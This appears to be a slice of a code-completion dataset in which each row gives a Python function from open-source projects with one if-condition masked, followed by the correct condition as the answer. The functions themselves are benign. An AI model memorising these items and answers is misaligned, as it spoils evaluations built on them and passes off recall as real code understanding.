4635,"def update_all(self, include_description=False):<tab>if self.background_update is None:<tab><tab>episodes = [row[self.C_EPISODE] for row in self]<tab>else:<tab><tab># Update all episodes that have already been initialized...<tab><tab>episodes = [<tab><tab><tab>row[self.C_EPISODE]<tab><tab><tab>for index, row in enumerate(self)<tab><tab><tab><IF-STMT><tab><tab>]<tab><tab># ...and also include episodes that still need to be initialized<tab><tab>episodes.extend(self.background_update.episodes)<tab>self._update_from_episodes(episodes, include_description)",if index < self . background_update . index,170
4636,"def _debug_log(self, text, level):<tab>if text and ""log"" in self.config.sys.debug:<tab><tab><IF-STMT><tab><tab><tab>text = ""%slog(%s): %s"" % (self.log_prefix, level, text)<tab><tab>if self.log_parent is not None:<tab><tab><tab>return self.log_parent.log(level, text)<tab><tab>else:<tab><tab><tab>self.term.write(self._fmt_log(text, level=level))",if not text . startswith ( self . log_prefix ) :,129
4637,"def save_new_objects(self, commit=True):<tab>self.new_objects = []<tab>for form in self.extra_forms:<tab><tab>if not form.has_changed():<tab><tab><tab>continue<tab><tab># If someone has marked an add form for deletion, don't save the<tab><tab># object.<tab><tab>if self.can_delete and self._should_delete_form(form):<tab><tab><tab>continue<tab><tab>self.new_objects.append(self.save_new(form, commit=commit))<tab><tab><IF-STMT><tab><tab><tab>self.saved_forms.append(form)<tab>return self.new_objects",if not commit :,151
4638,"def get_master_info(accounts_config, master):<tab>master_info = None<tab>for a in accounts_config[""accounts""]:<tab><tab><IF-STMT><tab><tab><tab>master_info = a<tab><tab><tab>break<tab><tab>if a[""account_id""] == master:<tab><tab><tab>master_info = a<tab><tab><tab>break<tab>if master_info is None:<tab><tab>raise ValueError(""Master account: %s not found in accounts config"" % (master))<tab>return master_info","if a [ ""name"" ] == master :",120
4639,"def update(attr, value=None):<tab>if value is not None:<tab><tab>setattr(draft, attr, value)<tab><tab><IF-STMT><tab><tab><tab># Update size, snippet too<tab><tab><tab>draft.size = len(value)<tab><tab><tab>draft.snippet = draft.calculate_html_snippet(value)","if attr == ""body"" :",78
4640,"def _process_property_change(self, msg):<tab>msg = super(Select, self)._process_property_change(msg)<tab>if ""value"" in msg:<tab><tab>if not self.values:<tab><tab><tab>pass<tab><tab><IF-STMT><tab><tab><tab>msg[""value""] = self.values[0]<tab><tab>else:<tab><tab><tab>if isIn(msg[""value""], self.unicode_values):<tab><tab><tab><tab>idx = indexOf(msg[""value""], self.unicode_values)<tab><tab><tab>else:<tab><tab><tab><tab>idx = indexOf(msg[""value""], self.labels)<tab><tab><tab>msg[""value""] = self._items[self.labels[idx]]<tab>msg.pop(""options"", None)<tab>return msg","elif msg [ ""value"" ] is None :",180
4641,"def removeEmptyDir(path, removeRoot=True):<tab>if not os.path.isdir(path):<tab><tab>return<tab># remove empty subfolders<tab>_files = os.listdir(path)<tab>if len(_files) > 0:<tab><tab>for f in _files:<tab><tab><tab>if not f.startswith(""."") and not f.startswith(""_""):<tab><tab><tab><tab>fullpath = os.path.join(path, f)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>removeEmptyDir(fullpath)<tab># if folder empty, delete it<tab>_files = os.listdir(path)<tab>if len(_files) == 0 and removeRoot:<tab><tab>Print.info(""Removing empty folder:"" + path)<tab><tab>os.rmdir(path)",if os . path . isdir ( fullpath ) :,181
4642,"def make_relative_to(self, kwds, relative_to):<tab>if relative_to and os.path.dirname(relative_to):<tab><tab>dirname = os.path.dirname(relative_to)<tab><tab>kwds = kwds.copy()<tab><tab>for key in ffiplatform.LIST_OF_FILE_NAMES:<tab><tab><tab>if key in kwds:<tab><tab><tab><tab>lst = kwds[key]<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>raise TypeError(""keyword '%s' should be a list or tuple"" % (key,))<tab><tab><tab><tab>lst = [os.path.join(dirname, fn) for fn in lst]<tab><tab><tab><tab>kwds[key] = lst<tab>return kwds","if not isinstance ( lst , ( list , tuple ) ) :",173
4643,"def ending(self, state):<tab>print_title("" STABLE PINS "")<tab>path_lists = trace_graph(state.graph)<tab>for k in sorted(state.mapping):<tab><tab>print(state.mapping[k].as_line(include_hashes=False))<tab><tab>paths = path_lists[k]<tab><tab>for path in paths:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print(""<tab>User requirement"")<tab><tab><tab><tab>continue<tab><tab><tab>print(""   "", end="""")<tab><tab><tab>for v in reversed(path[1:]):<tab><tab><tab><tab>line = state.mapping[v].as_line(include_hashes=False)<tab><tab><tab><tab>print("" <="", line, end="""")<tab><tab><tab>print()<tab>print()",if path == [ None ] :,183
4644,"def fetch():<tab>retval = {}<tab>content = retrieve_content(__url__)<tab>if __check__ in content:<tab><tab>for line in content.split(""\n""):<tab><tab><tab>line = line.strip()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>if "" # "" in line:<tab><tab><tab><tab>reason = line.split("" # "")[1].split()[0].lower()<tab><tab><tab><tab>if reason == ""scanning"":  # too many false positives<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>retval[line.split("" # "")[0]] = (__info__, __reference__)<tab>return retval","if not line or line . startswith ( ""#"" ) or ""."" not in line :",157
4645,"def __str__(self):<tab>""""""Returns human readable string representation, useful for debugging.""""""<tab>buf = StringIO()<tab>for idx, (class_batch_id, class_val) in enumerate(iteritems(self.data)):<tab><tab><IF-STMT><tab><tab><tab>buf.write(u""  ...\n"")<tab><tab><tab>break<tab><tab>buf.write(u'  ClassBatch ""{0}""\n'.format(class_batch_id))<tab><tab>buf.write(u""<tab>{0}\n"".format(str(class_val)))<tab>return buf.getvalue()",if idx >= TO_STR_MAX_BATCHES :,142
4646,"def find_caller(stack):<tab>""""""Finds info about first non-sqlalchemy call in stack""""""<tab>for frame in stack:<tab><tab># We don't care about sqlalchemy internals<tab><tab>module = inspect.getmodule(frame[0])<tab><tab>if not hasattr(module, ""__name__""):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>return (module.__name__,) + tuple(frame[2:4]) + (frame[4][0].strip(),)<tab>log.warning(""Transaction from unknown origin"")<tab>return None, None, None, None","if module . __name__ . startswith ( ""sqlalchemy"" ) :",137
4647,"def format_unencoded(self, tokensource, outfile):<tab>if self.linenos:<tab><tab>self._write_lineno(outfile)<tab>for ttype, value in tokensource:<tab><tab>color = self._get_color(ttype)<tab><tab>for line in value.splitlines(True):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>outfile.write(""<%s>%s</>"" % (color, line.rstrip(""\n"")))<tab><tab><tab>else:<tab><tab><tab><tab>outfile.write(line.rstrip(""\n""))<tab><tab><tab>if line.endswith(""\n""):<tab><tab><tab><tab>if self.linenos:<tab><tab><tab><tab><tab>self._write_lineno(outfile)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>outfile.write(""\n"")<tab>if self.linenos:<tab><tab>outfile.write(""\n"")",if color :,190
4648,"def __new__(cls, name, bases, attrs):<tab>klass = type.__new__(cls, name, bases, attrs)<tab>if ""cmds"" in attrs:<tab><tab>cmds = attrs[""cmds""]<tab><tab><IF-STMT><tab><tab><tab>cmd_handler_mapping[cmds] = klass<tab><tab>else:<tab><tab><tab>for cmd in cmds:<tab><tab><tab><tab>cmd_handler_mapping[cmd] = klass<tab>return klass","if isinstance ( cmds , str ) :",104
4649,"def __getattr__(self, key):<tab>if key == key.upper():<tab><tab><IF-STMT><tab><tab><tab>return getattr(self._django_settings, key)<tab><tab>elif hasattr(self._default_settings, key):<tab><tab><tab>return getattr(self._default_settings, key)<tab>raise AttributeError(<tab><tab>""%r object has no attribute %r"" % (self.__class__.__name__, key)<tab>)","if hasattr ( self . _django_settings , key ) :",106
4650,"def download_file(url):<tab>local_filename = url.split(""/"")[-1]<tab>outfile = os.path.join(AVATAR_DIR, local_filename)<tab>if not os.path.isfile(outfile):<tab><tab>r = requests.get(url, stream=True)<tab><tab>with open(outfile, ""wb"") as f:<tab><tab><tab>for chunk in r.iter_content(chunk_size=1024):<tab><tab><tab><tab><IF-STMT>  # filter out keep-alive new chunks<tab><tab><tab><tab><tab>f.write(chunk)<tab><tab><tab><tab><tab>f.flush()<tab>return local_filename",if chunk :,143
4651,"def check_default(self):<tab>if self.check():<tab><tab>self.credentials = []<tab><tab>data = LockedIterator(itertools.product(self.usernames, self.passwords))<tab><tab>self.run_threads(self.threads, self.target_function, data)<tab><tab><IF-STMT><tab><tab><tab>return self.credentials<tab>return None",if self . credentials :,85
4652,"def _process_frame(self, frame_num, frame_im, callback=None):<tab># type(int, numpy.ndarray) -> None<tab>""""""Adds any cuts detected with the current frame to the cutting list.""""""<tab>for detector in self._detector_list:<tab><tab>cuts = detector.process_frame(frame_num, frame_im)<tab><tab>if cuts and callback:<tab><tab><tab>callback(frame_im, frame_num)<tab><tab>self._cutting_list += cuts<tab>for detector in self._sparse_detector_list:<tab><tab>events = detector.process_frame(frame_num, frame_im)<tab><tab><IF-STMT><tab><tab><tab>callback(frame_im, frame_num)<tab><tab>self._event_list += events",if events and callback :,178
4653,"def parse(cls, api, json):<tab>user = cls(api)<tab>setattr(user, ""_json"", json)<tab>for k, v in json.items():<tab><tab>if k == ""created_at"":<tab><tab><tab>setattr(user, k, parse_datetime(v))<tab><tab>elif k == ""status"":<tab><tab><tab>setattr(user, k, Status.parse(api, v))<tab><tab><IF-STMT><tab><tab><tab># twitter sets this to null if it is false<tab><tab><tab>if v is True:<tab><tab><tab><tab>setattr(user, k, True)<tab><tab><tab>else:<tab><tab><tab><tab>setattr(user, k, False)<tab><tab>else:<tab><tab><tab>setattr(user, k, v)<tab>return user","elif k == ""following"" :",179
4654,def dump_token_list(tokens):<tab>for token in tokens:<tab><tab><IF-STMT><tab><tab><tab>writer.write(token.contents)<tab><tab>elif token.token_type == TOKEN_VAR:<tab><tab><tab>writer.print_expr(token.contents)<tab><tab><tab>touch_var(token.contents),if token . token_type == TOKEN_TEXT :,83
4655,"def parent_path(path):<tab>parent_dir = S3FileSystem._append_separator(path)<tab>if not s3.is_root(parent_dir):<tab><tab>bucket_name, key_name, basename = s3.parse_uri(path)<tab><tab><IF-STMT>  # bucket is top-level so return root<tab><tab><tab>parent_dir = S3A_ROOT<tab><tab>else:<tab><tab><tab>bucket_path = ""%s%s"" % (S3A_ROOT, bucket_name)<tab><tab><tab>key_path = ""/"".join(key_name.split(""/"")[:-1])<tab><tab><tab>parent_dir = s3.abspath(bucket_path, key_path)<tab>return parent_dir",if not basename :,168
4656,"def write_framed_message(self, message):<tab>message_length = len(message)<tab>total_bytes_sent = 0<tab>while message_length - total_bytes_sent > 0:<tab><tab><IF-STMT><tab><tab><tab>buffer_length = BUFFER_SIZE<tab><tab>else:<tab><tab><tab>buffer_length = message_length - total_bytes_sent<tab><tab>self.write_buffer(<tab><tab><tab>message[total_bytes_sent : (total_bytes_sent + buffer_length)]<tab><tab>)<tab><tab>total_bytes_sent += buffer_length<tab># A message is always terminated by a zero-length buffer.<tab>self.write_buffer_length(0)",if message_length - total_bytes_sent > BUFFER_SIZE :,177
4657,"def reader():<tab>with tarfile.open(filename, mode=""r"") as f:<tab><tab>names = (each_item.name for each_item in f if sub_name in each_item.name)<tab><tab>while True:<tab><tab><tab>for name in names:<tab><tab><tab><tab>if six.PY2:<tab><tab><tab><tab><tab>batch = pickle.load(f.extractfile(name))<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>batch = pickle.load(f.extractfile(name), encoding=""bytes"")<tab><tab><tab><tab>for item in read_batch(batch):<tab><tab><tab><tab><tab>yield item<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break",if not cycle :,157
4658,"def splitOn(sequence, predicate, transformers):<tab>result = []<tab>mode = predicate(sequence[0])<tab>tmp = [sequence[0]]<tab>for e in sequence[1:]:<tab><tab>p = predicate(e)<tab><tab><IF-STMT><tab><tab><tab>result.extend(transformers[mode](tmp))<tab><tab><tab>tmp = [e]<tab><tab><tab>mode = p<tab><tab>else:<tab><tab><tab>tmp.append(e)<tab>result.extend(transformers[mode](tmp))<tab>return result",if p != mode :,122
4659,"def stroke(s):<tab>keys = []<tab>on_left = True<tab>for k in s:<tab><tab>if k in ""EU*-"":<tab><tab><tab>on_left = False<tab><tab>if k == ""-"":<tab><tab><tab>continue<tab><tab>elif k == ""*"":<tab><tab><tab>keys.append(k)<tab><tab><IF-STMT><tab><tab><tab>keys.append(k + ""-"")<tab><tab>else:<tab><tab><tab>keys.append(""-"" + k)<tab>return Stroke(keys)",elif on_left :,116
4660,"def check(data_dir, decrypter, read_only=False):<tab>fname = os.path.join(data_dir, DIGEST_NAME)<tab>if os.path.exists(fname):<tab><tab>if decrypter is None:<tab><tab><tab>return False<tab><tab>f = open(fname, ""rb"")<tab><tab>s = f.read()<tab><tab>f.close()<tab><tab>return decrypter.decrypt(s) == MAGIC_STRING<tab>else:<tab><tab>if decrypter is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab><tab>else:<tab><tab><tab><tab>s = decrypter.encrypt(MAGIC_STRING)<tab><tab><tab><tab>f = open(fname, ""wb"")<tab><tab><tab><tab>f.write(s)<tab><tab><tab><tab>f.close()<tab><tab>return True",if read_only :,198
4661,def get_sentence(self):<tab>while True:<tab><tab>self._seed += 1<tab><tab>all_files = list(self._all_files)<tab><tab>if self._shuffle:<tab><tab><tab>if self._n_gpus > 1:<tab><tab><tab><tab>random.seed(self._seed)<tab><tab><tab>random.shuffle(all_files)<tab><tab>for file_path in all_files:<tab><tab><tab>for ret in self._load_file(file_path):<tab><tab><tab><tab>yield ret<tab><tab><IF-STMT><tab><tab><tab>break,"if self . _mode == ""test"" :",134
4662,"def on_epoch_end(self, batch, logs=None):<tab># At the end of every epoch, remask the weights. This ensures that when<tab># the model is saved after completion, the weights represent mask*weights.<tab>weight_mask_ops = []<tab>for layer in self.prunable_layers:<tab><tab><IF-STMT><tab><tab><tab>if tf.executing_eagerly():<tab><tab><tab><tab>layer.pruning_obj.weight_mask_op()<tab><tab><tab>else:<tab><tab><tab><tab>weight_mask_ops.append(layer.pruning_obj.weight_mask_op())<tab>K.batch_get_value(weight_mask_ops)","if isinstance ( layer , pruning_wrapper . PruneLowMagnitude ) :",166
4663,"def stroke(s):<tab>keys = []<tab>on_left = True<tab>for k in s:<tab><tab><IF-STMT><tab><tab><tab>on_left = False<tab><tab>if k == ""-"":<tab><tab><tab>continue<tab><tab>elif k == ""*"":<tab><tab><tab>keys.append(k)<tab><tab>elif on_left:<tab><tab><tab>keys.append(k + ""-"")<tab><tab>else:<tab><tab><tab>keys.append(""-"" + k)<tab>return Stroke(keys)","if k in ""EU*-"" :",116
4664,"def _plot_figure(self, idx):<tab>with self.renderer.state():<tab><tab>self.plot.update(idx)<tab><tab><IF-STMT><tab><tab><tab>figure_format = self.renderer.params(""fig"").objects[0]<tab><tab>else:<tab><tab><tab>figure_format = self.renderer.fig<tab><tab>return self.renderer._figure_data(self.plot, figure_format, as_script=True)[0]","if self . renderer . fig == ""auto"" :",110
4665,"def custom_format(slither, result):<tab>elements = result[""elements""]<tab>for element in elements:<tab><tab>target = element[""additional_fields""][""target""]<tab><tab>convention = element[""additional_fields""][""convention""]<tab><tab><IF-STMT><tab><tab><tab># l_O_I_should_not_be_used cannot be automatically patched<tab><tab><tab>logger.info(<tab><tab><tab><tab>f'The following naming convention cannot be patched: \n{result[""description""]}'<tab><tab><tab>)<tab><tab><tab>continue<tab><tab>_patch(slither, result, element, target)","if convention == ""l_O_I_should_not_be_used"" :",155
4666,"def refresh(self):<tab>if self._obj:<tab><tab>person = self._db.get_person_from_handle(self._obj.get_reference_handle())<tab><tab><IF-STMT><tab><tab><tab>frel = str(self._obj.get_father_relation())<tab><tab><tab>mrel = str(self._obj.get_mother_relation())<tab><tab><tab>self._title = _(""%(frel)s %(mrel)s"") % {""frel"": frel, ""mrel"": mrel}<tab><tab><tab>self._value = person.get_primary_name().get_name()",if person :,136
4667,"def append(self, child):<tab>if child not in (None, self):<tab><tab>tag = child_tag(self._tag)<tab><tab><IF-STMT><tab><tab><tab>if isinstance(child, Html):<tab><tab><tab><tab>if child.tag != tag:<tab><tab><tab><tab><tab>child = Html(tag, child)<tab><tab><tab>elif not child.startswith(""<%s"" % tag):<tab><tab><tab><tab>child = Html(tag, child)<tab><tab>super().append(child)",if tag :,113
4668,def _forward_main_responses(self):<tab>while self._should_keep_going():<tab><tab>line = self._proc.stdout.readline()<tab><tab>if self._main_backend_is_fresh and self._looks_like_echo(line):<tab><tab><tab># In the beginning the backend may echo commands sent to it (perhaps this echo-avoiding trick<tab><tab><tab># takes time). Don't forward those lines.<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>with self._response_lock:<tab><tab><tab>sys.stdout.write(line)<tab><tab><tab>sys.stdout.flush()<tab><tab><tab>self._main_backend_is_fresh = False,if not line :,161
4669,"def forward(self, inputs):<tab>x = inputs[""image""]<tab>out = self.conv0(x)<tab>out = self.downsample0(out)<tab>blocks = []<tab>for i, conv_block_i in enumerate(self.darknet_conv_block_list):<tab><tab>out = conv_block_i(out)<tab><tab><IF-STMT><tab><tab><tab>out.stop_gradient = True<tab><tab>if i in self.return_idx:<tab><tab><tab>blocks.append(out)<tab><tab>if i < self.num_stages - 1:<tab><tab><tab>out = self.downsample_list[i](out)<tab>return blocks",if i == self . freeze_at :,159
4670,"def check_backslashes(payload):<tab># Check for single quotes<tab>if payload.count(""\\"") >= 15:<tab><tab>if not settings.TAMPER_SCRIPTS[""backslashes""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>menu.options.tamper = menu.options.tamper + "",backslashes""<tab><tab><tab>else:<tab><tab><tab><tab>menu.options.tamper = ""backslashes""<tab><tab>from src.core.tamper import backslashes<tab><tab>payload = backslashes.tamper(payload)",if menu . options . tamper :,130
4671,"def __init__(self, config_lists):<tab>self.lens = len(config_lists)<tab>self.spaces = []<tab>for config_list in config_lists:<tab><tab><IF-STMT><tab><tab><tab>key, config = config_list<tab><tab>elif isinstance(config_list, str):<tab><tab><tab>key = config_list<tab><tab><tab>config = None<tab><tab>else:<tab><tab><tab>raise NotImplementedError(<tab><tab><tab><tab>""the type of config is Error!!! Please check the config information. Receive the type of config is {}"".format(<tab><tab><tab><tab><tab>type(config_list)<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab>self.spaces.append(self._get_single_search_space(key, config))<tab>self.init_tokens()","if isinstance ( config_list , tuple ) :",186
4672,"def _source_tuple(af, address, port):<tab># Make a high level source tuple, or return None if address and port<tab># are both None<tab>if address or port:<tab><tab><IF-STMT><tab><tab><tab>if af == socket.AF_INET:<tab><tab><tab><tab>address = ""0.0.0.0""<tab><tab><tab>elif af == socket.AF_INET6:<tab><tab><tab><tab>address = ""::""<tab><tab><tab>else:<tab><tab><tab><tab>raise NotImplementedError(f""unknown address family {af}"")<tab><tab>return (address, port)<tab>else:<tab><tab>return None",if address is None :,144
4673,"def test_compatibility(self) -> None:<tab>for expected, user_agent in self.data:<tab><tab>result = self.client_get(""/compatibility"", HTTP_USER_AGENT=user_agent)<tab><tab><IF-STMT><tab><tab><tab>self.assert_json_success(result)<tab><tab>elif expected == ""old"":<tab><tab><tab>self.assert_json_error(result, ""Client is too old"")<tab><tab>else:<tab><tab><tab>assert False  # nocoverage","if expected == ""ok"" :",114
4674,"def __init__(self, parent_element):<tab>if parent_element.items():<tab><tab>self.update(dict(parent_element.items()))<tab>for element in parent_element:<tab><tab>if len(element) > 0:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>aDict = ListParser(element)<tab><tab><tab>else:<tab><tab><tab><tab>aDict = DictParser(element)<tab><tab><tab>if element.items():<tab><tab><tab><tab>aDict.update(dict(element.items()))<tab><tab><tab>self.update({element.tag: aDict})<tab><tab>elif element.items():<tab><tab><tab>self.update({element.tag: dict(element.items())})<tab><tab>else:<tab><tab><tab>self.update({element.tag: element.text})",if element . tag == element [ 0 ] . tag :,190
4675,"def delta_page(self, x: float = 0.0, y: float = 0.0) -> None:<tab>if y.is_integer():<tab><tab>y = int(y)<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab>elif y < 0:<tab><tab><tab>self.page_up(count=-y)<tab><tab>elif y > 0:<tab><tab><tab>self.page_down(count=y)<tab><tab>y = 0<tab>if x == 0 and y == 0:<tab><tab>return<tab>size = self._widget.page().mainFrame().geometry()<tab>self.delta(int(x * size.width()), int(y * size.height()))",if y == 0 :,160
4676,"def reader(self, myself):<tab>ok = True<tab>line = """"<tab>while True:<tab><tab>line = sys.stdin.readline().strip()<tab><tab><IF-STMT><tab><tab><tab>if not line:<tab><tab><tab><tab>ok = False<tab><tab><tab><tab>continue<tab><tab>elif not line:<tab><tab><tab>break<tab><tab>else:<tab><tab><tab>ok = True<tab><tab>self.Q.append(line)<tab>os.kill(myself, signal.SIGTERM)",if ok :,112
4677,"def leave(self, reason=None):<tab>try:<tab><tab>if self.id.startswith(""C""):<tab><tab><tab>log.info(""Leaving channel %s (%s)"", self, self.id)<tab><tab><tab>self._bot.webclient.channels_leave(channel=self.id)<tab><tab>else:<tab><tab><tab>log.info(""Leaving group %s (%s)"", self, self.id)<tab><tab><tab>self._bot.webclient.groups_leave(channel=self.id)<tab>except SlackAPIResponseError as e:<tab><tab><IF-STMT><tab><tab><tab>raise RoomError(f""Unable to leave channel. {USER_IS_BOT_HELPTEXT}"")<tab><tab>else:<tab><tab><tab>raise RoomError(e)<tab>self._id = None","if e . error == ""user_is_bot"" :",191
4678,"def wrap_lines(text, cols=60):<tab>ret = """"<tab>words = re.split(""(\s+)"", text)<tab>linelen = 0<tab>for w in words:<tab><tab><IF-STMT><tab><tab><tab>ret += "" \\\n""<tab><tab><tab>ret += ""   ""<tab><tab><tab>linelen = 0<tab><tab>if linelen == 0 and w.strip() == """":<tab><tab><tab>continue<tab><tab>ret += w<tab><tab>linelen += len(w)<tab>return ret",if linelen + len ( w ) > cols - 1 :,123
4679,"def transport_vmware_guestinfo():<tab>rpctool = ""vmware-rpctool""<tab>not_found = None<tab>if not subp.which(rpctool):<tab><tab>return not_found<tab>cmd = [rpctool, ""info-get guestinfo.ovfEnv""]<tab>try:<tab><tab>out, _err = subp.subp(cmd)<tab><tab>if out:<tab><tab><tab>return out<tab><tab>LOG.debug(""cmd %s exited 0 with empty stdout: %s"", cmd, out)<tab>except subp.ProcessExecutionError as e:<tab><tab><IF-STMT><tab><tab><tab>LOG.warning(""%s exited with code %d"", rpctool, e.exit_code)<tab><tab><tab>LOG.debug(e)<tab>return not_found",if e . exit_code != 1 :,196
4680,"def handle_noargs(self, **options):<tab># Inspired by Postfix's ""postconf -n"".<tab>from django.conf import settings, global_settings<tab># Because settings are imported lazily, we need to explicitly load them.<tab>settings._setup()<tab>user_settings = module_to_dict(settings._wrapped)<tab>default_settings = module_to_dict(global_settings)<tab>output = []<tab>for key in sorted(user_settings.keys()):<tab><tab><IF-STMT><tab><tab><tab>output.append(""%s = %s  ###"" % (key, user_settings[key]))<tab><tab>elif user_settings[key] != default_settings[key]:<tab><tab><tab>output.append(""%s = %s"" % (key, user_settings[key]))<tab>return ""\n"".join(output)",if key not in default_settings :,196
4681,"def channel_sizes(self):<tab>""""""List of channel sizes: [(width, height)].""""""<tab>sizes = []<tab>for channel in self.channel_info:<tab><tab>if channel.id == ChannelID.USER_LAYER_MASK:<tab><tab><tab>sizes.append((self.mask_data.width, self.mask_data.height))<tab><tab><IF-STMT><tab><tab><tab>sizes.append((self.mask_data.real_width, self.mask_data.real_height))<tab><tab>else:<tab><tab><tab>sizes.append((self.width, self.height))<tab>return sizes",elif channel . id == ChannelID . REAL_USER_LAYER_MASK :,151
4682,"def get(self, key, default=None, version=None):<tab>fname = self._key_to_file(key, version)<tab>try:<tab><tab>with io.open(fname, ""rb"") as f:<tab><tab><tab>if not self._is_expired(f):<tab><tab><tab><tab>return pickle.loads(zlib.decompress(f.read()))<tab>except IOError as e:<tab><tab><IF-STMT><tab><tab><tab>raise<tab>return default",if e . errno != errno . ENOENT :,112
4683,"def check_grads(grads_and_vars):<tab>has_nan_ops = []<tab>amax_ops = []<tab>for grad, _ in grads_and_vars:<tab><tab><IF-STMT><tab><tab><tab>if isinstance(grad, tf.IndexedSlices):<tab><tab><tab><tab>x = grad.values<tab><tab><tab>else:<tab><tab><tab><tab>x = grad<tab><tab><tab>has_nan_ops.append(tf.reduce_any(tf.is_nan(x)))<tab><tab><tab>amax_ops.append(tf.reduce_max(tf.abs(x)))<tab>has_nan = tf.reduce_any(has_nan_ops)<tab>amax = tf.reduce_max(amax_ops)<tab>return has_nan, amax",if grad is not None :,179
4684,"def daily(self, component):<tab>with component.repository.lock:<tab><tab>path = self.get_linguas_path(component)<tab><tab><IF-STMT><tab><tab><tab>self.commit_and_push(component, [path])","if self . sync_linguas ( component , path ) :",67
4685,"def _set_posonly_args_def(self, argmts, vals):<tab>for v in vals:<tab><tab>argmts.posonlyargs.append(v[""arg""])<tab><tab>d = v[""default""]<tab><tab>if d is not None:<tab><tab><tab>argmts.defaults.append(d)<tab><tab><IF-STMT><tab><tab><tab>self._set_error(""non-default argument follows default argument"")",elif argmts . defaults :,97
4686,"def isOrHasChild(parent, child):<tab>while child:<tab><tab>if compare(parent, child):<tab><tab><tab>return True<tab><tab>child = child.parentNode<tab><tab>if not child:<tab><tab><tab>return False<tab><tab><IF-STMT><tab><tab><tab>child = None<tab>return False",if child . nodeType != 1 :,76
4687,def Proc2(IntParIO):<tab>IntLoc = IntParIO + 10<tab>while 1:<tab><tab><IF-STMT><tab><tab><tab>IntLoc = IntLoc - 1<tab><tab><tab>IntParIO = IntLoc - IntGlob<tab><tab><tab>EnumLoc = Ident1<tab><tab>if EnumLoc == Ident1:<tab><tab><tab>break<tab>return IntParIO,"if Char1Glob == ""A"" :",90
4688,"def _GetParserChains(self, events):<tab>""""""Return a dict with a plugin count given a list of events.""""""<tab>parser_chains = {}<tab>for event in events:<tab><tab>parser_chain = getattr(event, ""parser"", None)<tab><tab>if not parser_chain:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>parser_chains[parser_chain] += 1<tab><tab>else:<tab><tab><tab>parser_chains[parser_chain] = 1<tab>return parser_chains",if parser_chain in parser_chains :,122
4689,"def _url_encode_impl(obj, charset, encode_keys, sort, key):<tab>iterable = sdict()<tab>for key, values in obj.items():<tab><tab>if not isinstance(values, list):<tab><tab><tab>values = [values]<tab><tab>iterable[key] = values<tab>if sort:<tab><tab>iterable = sorted(iterable, key=key)<tab>for key, values in iterable.items():<tab><tab>for value in values:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>if not isinstance(key, bytes):<tab><tab><tab><tab>key = str(key).encode(charset)<tab><tab><tab>if not isinstance(value, bytes):<tab><tab><tab><tab>value = str(value).encode(charset)<tab><tab><tab>yield url_quote_plus(key) + ""="" + url_quote_plus(value)",if value is None :,198
4690,"def getZoneOffset(d):<tab>zoffs = 0<tab>try:<tab><tab>if d[""zulu""] == None:<tab><tab><tab>zoffs = 60 * int(d[""tzhour""]) + int(d[""tzminute""])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>zoffs = -zoffs<tab>except TypeError:<tab><tab>pass<tab>return zoffs","if d [ ""tzsign"" ] != ""-"" :",92
4691,"def run(self):<tab>predictor = DefaultPredictor(self.cfg)<tab>while True:<tab><tab>task = self.task_queue.get()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>idx, data = task<tab><tab>result = predictor(data)<tab><tab>self.result_queue.put((idx, result))","if isinstance ( task , AsyncPredictor . _StopToken ) :",86
4692,"def _VarRefOrWord(node, dynamic_arith):<tab># type: (arith_expr_t, bool) -> bool<tab>with tagswitch(node) as case:<tab><tab>if case(arith_expr_e.VarRef):<tab><tab><tab>return True<tab><tab>elif case(arith_expr_e.Word):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab>return False",if dynamic_arith :,96
4693,"def command(self, reset=True, wait=True, wait_all=False, quiet=False):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return self._success(_(""Loaded metadata index""))<tab><tab>else:<tab><tab><tab>return self._error(_(""Failed to load metadata index""))<tab>except IOError:<tab><tab>return self._error(_(""Failed to decrypt configuration, "" ""please log in!""))","if self . _idx ( reset = reset , wait = wait , wait_all = wait_all , quiet = quiet ) :",113
4694,"def init_weights(self):<tab>for module in self.decoder.modules():<tab><tab>if isinstance(module, (nn.Linear, nn.Embedding)):<tab><tab><tab>module.weight.data.normal_(mean=0.0, std=0.02)<tab><tab>elif isinstance(module, nn.LayerNorm):<tab><tab><tab>module.bias.data.zero_()<tab><tab><tab>module.weight.data.fill_(1.0)<tab><tab><IF-STMT><tab><tab><tab>module.bias.data.zero_()<tab>for p in self.generator.parameters():<tab><tab>if p.dim() > 1:<tab><tab><tab>xavier_uniform_(p)<tab><tab>else:<tab><tab><tab>p.data.zero_()","if isinstance ( module , nn . Linear ) and module . bias is not None :",179
4695,"def write_conditional_formatting(worksheet):<tab>""""""Write conditional formatting to xml.""""""<tab>wb = worksheet.parent<tab>for range_string, rules in iteritems(worksheet.conditional_formatting.cf_rules):<tab><tab>cf = Element(""conditionalFormatting"", {""sqref"": range_string})<tab><tab>for rule in rules:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if rule.dxf != DifferentialStyle():<tab><tab><tab><tab><tab>rule.dxfId = len(wb._differential_styles)<tab><tab><tab><tab><tab>wb._differential_styles.append(rule.dxf)<tab><tab><tab>cf.append(rule.to_tree())<tab><tab>yield cf",if rule . dxf is not None :,164
